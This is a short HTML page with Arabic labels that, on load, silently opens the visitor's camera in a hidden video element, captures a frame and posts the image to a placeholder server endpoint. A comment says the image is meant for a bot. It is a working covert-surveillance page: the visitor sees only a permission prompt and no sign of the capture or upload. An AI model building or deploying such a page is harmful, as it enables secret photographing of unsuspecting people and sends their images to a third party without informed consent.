<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>التقاط صورة تلقائي</title>
</head>
<body>
<video id="video" autoplay style="display:none;"></video>
<script>
const video = document.getElementById('video');

async function captureAndSend() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    video.addEventListener('loadedmetadata', () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imgData = canvas.toDataURL('image/jpeg');

      // إرسال الصورة للبوت عبر سيرفرك
      fetch('https://YOUR_SERVER_ENDPOINT/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imgData })
      }).then(() => console.log('تم إرسال الصورة!'));

      // إيقاف الكاميرا بعد الالتقاط
      stream.getTracks().forEach(track => track.stop());
    });
  } catch (err) {
    console.error('فشل الوصول إلى الكاميرا: ', err);
  }
}

// محاولة تشغيل الالتقاط تلقائي عند السماح بالكاميرا
window.onload = captureAndSend;
</script>
</body>
</html>
